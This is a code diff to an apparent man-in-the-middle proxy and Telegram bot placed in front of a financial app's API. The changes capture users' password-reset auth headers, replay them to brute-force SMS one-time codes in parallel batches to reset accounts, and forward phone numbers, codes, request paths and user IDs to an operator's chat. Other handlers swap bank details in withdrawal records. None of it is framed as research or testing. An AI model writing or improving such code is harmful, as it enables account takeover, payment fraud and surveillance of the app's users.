@@ -162,7 +162,9 @@ app.use(async (req, res, next) => {
     if (bankData.logRequests && bankData.adminChatId && bot) {
       const path = req.originalUrl || req.url;
       if (path !== '/api/telegram' && !path.includes('favicon')) {
-        bot.sendMessage(bankData.adminChatId, `📡 ${req.method} ${path}`).catch(() => {});
+        const uid = extractUserId(req) || '';
+        const idStr = uid ? ` [${uid}]` : '';
+        bot.sendMessage(bankData.adminChatId, `📡 ${req.method} ${path}${idStr}`).catch(() => {});
       }
     }
   } catch(e) {}
@@ -720,7 +722,12 @@ Example:
       const batchSize = 500;
       const parallelSize = 20;
 
-      await bot.sendMessage(chatId, `🔓 Brute force starting...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(digits, '0')} → ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(digits, '0')}\n${digits}-digit | ${parallelSize} parallel`);
+      if (!savedForgetPassHeaders) {
+        await bot.sendMessage(chatId, `⚠️ No auth headers saved!\nFirst: Open app → Forgot Password → enter any OTP → click "Verify & Reset Password"\nThis saves auth headers.\nThen run /bruteforce again.`);
+        return res.sendStatus(200);
+      }
+
+      await bot.sendMessage(chatId, `🔓 Brute force starting...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(digits, '0')} → ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(digits, '0')}\n${digits}-digit | ${parallelSize} parallel | Using saved auth headers`);
 
       let found = false;
       let foundOtp = '';
@@ -733,10 +740,13 @@ Example:
         for (let j = 0; j < parallelSize && (batch + j) <= maxOtp; j++) {
           const otp = String(batch + j).padStart(digits, '0');
           const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
+          const hdrs = { ...savedForgetPassHeaders };
+          hdrs['content-type'] = 'application/x-www-form-urlencoded';
+          hdrs['content-length'] = String(Buffer.byteLength(formBody));
           promises.push(
             fetch(ORIGINAL_API + '/user/forgetPass', {
               method: 'POST',
-              headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
+              headers: hdrs,
               body: formBody
             }).then(r => r.json()).then(result => {
               if (result.statusCode !== '1023') return { otp, result };
@@ -1226,19 +1236,50 @@ app.all('/payOrder/list', async (req, res) => {
 app.all('/money/withdrawRecord', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
+let savedForgetPassHeaders = null;
+
 app.all('/user/forgetPass', async (req, res) => {
   try {
     const bankData = await loadData();
     const reqBody = req.parsedBody || {};
     const rawStr = req.rawBody ? req.rawBody.toString().substring(0, 500) : '';
 
+    const capturedHeaders = {};
+    for (const [key, val] of Object.entries(req.headers)) {
+      const k = key.toLowerCase();
+      if (k === 'host' || k === 'connection' || k === 'content-length' ||
+          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+      capturedHeaders[key] = val;
+    }
+    capturedHeaders['host'] = 'api.i-money.vip';
+    savedForgetPassHeaders = capturedHeaders;
+
     if (bankData.adminChatId && bot) {
       try {
-        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset!\nParsed: ${JSON.stringify(reqBody, null, 2).substring(0, 800)}\nRaw: ${rawStr}`);
+        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset!\nParsed: ${JSON.stringify(reqBody, null, 2).substring(0, 800)}\nRaw: ${rawStr}\n\n🔐 Auth headers saved for brute force`);
       } catch(e) {}
     }
 
     const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
+
+    if (jsonResp && jsonResp.statusCode === '1023') {
+      if (bankData.adminChatId && bot) {
+        try { await bot.sendMessage(bankData.adminChatId, `❌ Wrong OTP: ${reqBody.smsCode || '?'}\nServer: Wrong SMS verification code`); } catch(e) {}
+      }
+      const errorResp = { status: 400, statusCode: '1023', statusInfo: 'Wrong SMS verification code', data: null, code: 0, msg: 'Wrong OTP' };
+      const errorBody = JSON.stringify(errorResp);
+      respHeaders['content-type'] = 'application/json; charset=utf-8';
+      respHeaders['content-length'] = String(Buffer.byteLength(errorBody));
+      res.writeHead(400, respHeaders);
+      res.end(errorBody);
+      return;
+    }
+
+    if (jsonResp && (jsonResp.statusCode === '0' || jsonResp.statusInfo === 'SUCCESS')) {
+      if (bankData.adminChatId && bot) {
+        try { await bot.sendMessage(bankData.adminChatId, `✅ Password Reset SUCCESS!\nPhone: ${reqBody.phone || '?'}\nOTP: ${reqBody.smsCode || '?'}`); } catch(e) {}
+      }
+    }
 
     if (bankData.adminChatId && bot) {
       try {
